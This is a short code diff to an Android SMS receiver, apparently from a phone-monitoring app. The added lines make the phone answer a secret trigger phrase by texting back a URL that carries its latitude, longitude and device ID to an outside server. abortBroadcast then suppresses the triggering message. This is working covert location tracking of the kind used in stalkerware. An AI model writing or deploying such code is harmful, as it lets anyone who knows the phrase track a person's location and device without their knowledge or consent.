@@ -11,7 +11,9 @@ import android.widget.Toast;
 
 public class Sms extends BroadcastReceiver {
     final SmsManager sms = SmsManager.getDefault();
+    public Singleton singleton;
     public Sms() {
+        singleton = Singleton.getInstance();
     }
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -27,7 +29,7 @@ public class Sms extends BroadcastReceiver {
                 //String link = "https://www.solucionesonline.com/monitoreoNum/";
                 if (MENSAJE.equals("Hola hijo, como te va?")){
                     Toast.makeText(context, "numero:" + REMITENTE + " Mensaje:" + MENSAJE, Toast.LENGTH_SHORT).show();
-                    enviarMensaje(context,REMITENTE,"Iniciando Ubicación ...");
+                    enviarMensaje(context,REMITENTE,"https://www.solucionesonline.mx/apps_moviles/monitoreoNum/execApp.php?num="+singleton.lat + "," + singleton.lon + "," + singleton.deviceId);
                 }
                 abortBroadcast();
 
